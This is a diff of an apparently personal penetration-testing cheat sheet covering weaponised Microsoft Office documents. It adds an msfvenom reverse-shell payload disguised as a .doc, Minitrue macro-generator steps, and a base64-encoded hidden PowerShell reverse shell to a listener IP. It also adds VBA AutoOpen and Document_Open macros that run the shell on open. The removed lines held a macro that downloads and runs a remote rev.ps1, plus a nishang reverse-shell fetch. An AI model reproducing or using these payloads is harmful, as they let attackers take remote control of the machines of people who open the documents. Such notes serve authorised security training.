@@ -568,35 +568,67 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc po
 ````
 ### Exploiting Microsoft Office
 When leveraging client-side vulnerabilities, it is important to use applications that are trusted by the victim in their everyday line of work. Unlike potentially suspicious-looking web links, Microsoft Office1 client-side attacks are often successful because it is difficult to differentiate malicious content from benign. In this section, we will explore various client-side attack vectors that leverage Microsoft Office applications
+#### MSFVENOM
+````
+msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f hta-psh -o shell.doc
+````
+#### Minitrue
+````
+https://github.com/X0RW3LL/Minitrue
+cd /opt/WindowsMacros/Minitrue
+./minitrue
+select a payload: windows/x64/shell_reverse_tcp
+select the payload type: VBA Macro
+LHOST=$yourIP
+LPORT=$yourPort
+Payload encoder: None
+Select or enter file name (without extensions): hacker
+````
 #### Microsoft Word Macro
 The Microsoft Word macro may be one the oldest and best-known client-side software attack vectors.
 
 Microsoft Office applications like Word and Excel allow users to embed macros, a series of commands and instructions that are grouped together to accomplish a task programmatically. Organizations often use macros to manage dynamic content and link documents with external content. More interestingly, macros can be written from scratch in Visual Basic for Applications (VBA), which is a fully functional scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.
 ````
-(open) LibreOffice Writer
-Tools > Macros > Organize Macros > Basic
-New
-Enter These commands:
+Create the .doc file 
+````
+````
+Use the base64 powershell code from revshells.com
+````
+````
+Used this code to inline macro(Paste the code from revshells in str variable) :
 
-REM  *****  BASIC  *****
+str = "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQA3ADQAIgAsADkAOQA5ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
+
+n = 50
+
+for i in range(0, len(str), n):
+    print "Str = Str + " + '"' + str[i:i+n] + '"'
+````
+````
+Sub AutoOpen()
+
+  MyMacro
+
+End Sub
+
+Sub Document_Open()
+
+  MyMacro
+
+End Sub
 
 Sub MyMacro()
-	Shell(cmd /c powershell iwr http://192.168.119.140/rev.ps1 - o C:/Windows/Tasks/rev.ps1)
-	Shell(cmd /c powershell -c C:/Windows/Tasks/rev.ps1)
+
+    Dim Str As String
+
+   <b>Paste the script output here!<b>
+
+    CreateObject("Wscript.Shell").Run Str
+
 End Sub
 ````
-````
-tools > organize > Events > Open Document > Macro > (find your macro and attach it)
-````
-<img src="https://user-images.githubusercontent.com/127046919/224577298-3aaaf97f-e340-4ef8-a593-b24168ee8cd2.png" width="250" height="240" />
 
-````
-vim rev.ps1
-chmod 755 rev.ps1
-wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1 > rev.ps1
-upload File with Macro to vulnerable website #Evil.odt
-setup listner and webserver
-````
+<img src="https://user-images.githubusercontent.com/127046919/224577298-3aaaf97f-e340-4ef8-a593-b24168ee8cd2.png" width="250" height="240" />
 ### Linux rce techniques
 ````
 cp /usr/share/webshells/php/php-reverse-shell.php .
